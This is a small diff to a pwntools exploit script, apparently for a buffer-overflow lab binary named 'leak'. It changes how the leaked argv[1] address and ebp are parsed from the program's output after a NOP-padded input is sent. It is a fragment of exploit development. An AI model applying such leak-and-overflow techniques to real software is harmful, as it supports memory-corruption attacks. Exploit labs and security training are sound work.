@@ -2,6 +2,7 @@
 #encoding:utf-8
 
 import os
+import re
 from pwn import *
 from utils import *
 
@@ -31,9 +32,9 @@ def run_binary(binary, s=''):
     return shell.run(cmd)
 
 # leak the address of argv1 and ebp in main function.
-output = run_binary('./leak', NOPS(0xa0)).recvall().split('\n')
-addr = int(output[0], 16)
-ebp = int(output[1], 16)
+output = run_binary('./leak', NOPS(0xa0)).recvall()
+addr = int(re.findall(r'argv1 = (.*)\n', output)[0], 16)
+ebp = int(re.findall(r'ebp = (.*)\n', output)[0], 16)
 log.success('Get argv[1] addr: %#x' % addr)
 log.success('Get ebp: %#x' % ebp)
 
